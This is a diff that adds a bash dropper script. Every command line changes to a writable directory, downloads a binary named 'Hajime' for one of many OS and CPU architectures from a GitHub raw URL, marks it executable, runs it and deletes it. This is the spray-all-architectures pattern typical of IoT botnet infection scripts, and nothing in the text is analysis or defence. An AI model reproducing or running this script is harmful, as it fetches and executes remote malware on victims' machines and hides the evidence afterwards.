@@ -1,0 +1,26 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-darwin-amd64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-darwin-arm64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-dragonfly-amd64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-freebsd-386; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-freebsd-amd64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-freebsd-arm; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-386; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-amd64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-arm; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-arm64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv5; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv6; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv7; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-mips; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-mips64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-mips64le; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-mipsle; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-ppc64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-ppc64le; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-netbsd-386; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-netbsd-amd64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-netbsd-arm; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-openbsd-386; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-openbsd-amd64; chmod +x oink; ./oink; rm -rf oink
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-openbsd-arm; chmod +x oink; ./oink; rm -rf oink
